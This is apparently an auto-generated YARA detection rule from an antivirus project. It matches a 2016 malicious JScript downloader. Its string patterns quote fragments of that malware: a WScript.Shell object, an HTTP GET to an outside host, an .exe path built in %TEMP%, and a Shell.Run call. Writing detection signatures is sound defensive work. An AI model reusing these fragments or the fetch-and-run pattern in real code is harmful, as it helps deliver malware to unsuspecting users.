rule sig_20160330_c8d94743cd601d7e7cb5b986ae80a088 {
  meta:
    description = "datamaliciousorder - file 20160330_c8d94743cd601d7e7cb5b986ae80a088.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "debc122acd6f359d91711b48cdb1b11072332fe6bdff12e21bdc424294ed91ab"

  strings:
    $s1  = "var H0 = function L() {return WScript[LS](\"WScript\"+\".Shell\");}(), J = 11;" fullword ascii
    $s2  = "function WW(C, UA){LZ0 = LZ0 * 1; return C - UA;};" fullword ascii
    $s3  = "B0[O1](\"GET\", \"http://zakaz-sharikov.ru/x9dslp\", false);" fullword ascii
    $s4  = "if (B0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function R(){return M + \"\";};" fullword ascii
    $s6  = "function O() {return H0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"e8uPkd5sjW64QJ.ex\" + \"e\";};" fullword ascii
    $s7  = "function N() {return ((FJ == true) && (FJ == EF)) ? 1 : LZ0;};" fullword ascii
    $s8  = "function H(QV){H0[\"Run\"](QV, LZ0, LZ0);};" fullword ascii
    $s9  = "return WW(MR, BT);" fullword ascii
    $s10 = "var KJ = new this[\"Date\"]();" fullword ascii
    $s11 = "function BP(GX) {var ET = (1, 2, 3, 4, 5, GX); return ET;};" fullword ascii
    $s12 = "function O0(){return 22;};" fullword ascii
    $s13 = "function B()" fullword ascii
    $s14 = "function LZ(){return LS;};" fullword ascii
    $s15 = "}while (SF);" fullword ascii
    $s16 = "EF = true; " fullword ascii
    $s17 = "var EF = false;" fullword ascii
    $s18 = "var SH = false;" fullword ascii
    $s19 = "FJ = true; " fullword ascii
    $s20 = "var FJ = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}